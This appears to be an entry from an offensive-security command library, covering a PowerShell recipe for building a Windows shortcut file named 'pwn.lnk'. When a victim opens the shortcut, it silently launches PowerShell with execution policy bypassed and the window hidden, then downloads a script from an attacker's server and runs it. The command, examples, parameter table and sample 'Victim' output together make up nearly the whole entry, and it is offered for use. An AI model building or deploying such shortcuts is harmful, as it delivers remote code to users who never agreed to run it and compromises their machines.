---
id: 3fb06e57-6cc1-4626-a765-7b0af0c42dee
type: command
executor: powershell
data: >-
  $WScript = New-Object -COM WScript.shell

  $SC = $WScript.CreateShortcut('pwn.lnk')

  $SC.TargetPath="powershell.exe"

  $SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object
  Net.WebClient).downloadString('http://$_ATTACKER_IP/$_FILENAME.ps1')"

  $SC.Save()
output: >
  PS C:\Users\Victim> $WScript = New-Object -COM WScript.shell

  PS C:\Users\Victim> $SC = $WScript.CreateShortcut('pwn.lnk')

  PS C:\Users\Victim> $SC.TargetPath="powershell.exe"

  PS C:\Users\Victim> $SC.Arguments="-ep bypass -windowstyle hidden
  iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"

  PS C:\Users\Victim> $SC.Save()
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - lnk
  - powershell
verified: true
validated: true
---

# PowerShell-Create-LNK-File-with-PowerShell-Payload

## Command

```powershell
$WScript = New-Object -COM WScript.shell
$SC = $WScript.CreateShortcut('pwn.lnk')
$SC.TargetPath="powershell.exe"
$SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://$_ATTACKER_IP/$_FILENAME.ps1')"
$SC.Save()
```

## Description

This PowerShell script creates a Windows .LNK shortcut file that launches powershell.exe with arguments to bypass execution policy, hide the window, download a script from a URL, and execute it inline. It is used to craft malicious shortcuts for user-executed payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker's web server | Yes |
| $_FILENAME | Name of the payload file (without .ps1 extension) | Yes |
| 'pwn.lnk' | Output filename for the LNK (hardcoded, customizable) | No |
| -ep bypass | Bypass PowerShell execution policy | Built-in |
| -windowstyle hidden | Hide the PowerShell window | Built-in |

## Examples

### Basic Usage

```powershell
$WScript = New-Object -COM WScript.shell
$SC = $WScript.CreateShortcut('pwn.lnk')
$SC.TargetPath="powershell.exe"
$SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
$SC.Save()
```

### Advanced Usage

```powershell
# Change output filename
$SC = $WScript.CreateShortcut('shortcut.lnk')
# Add icon or other properties if needed
$SC.IconLocation = "shell32.dll,50"
$SC.Save()
```

## Expected Output

PS C:\Users\Victim> $WScript = New-Object -COM WScript.shell
PS C:\Users\Victim> $SC = $WScript.CreateShortcut('pwn.lnk')
PS C:\Users\Victim> $SC.TargetPath="powershell.exe"
PS C:\Users\Victim> $SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
PS C:\Users\Victim> $SC.Save()

> No explicit output; success is indicated by the creation of the .LNK file.

## Related

- [[procedures/Create-LNK-File-with-Custom-PowerShell-Payload]]
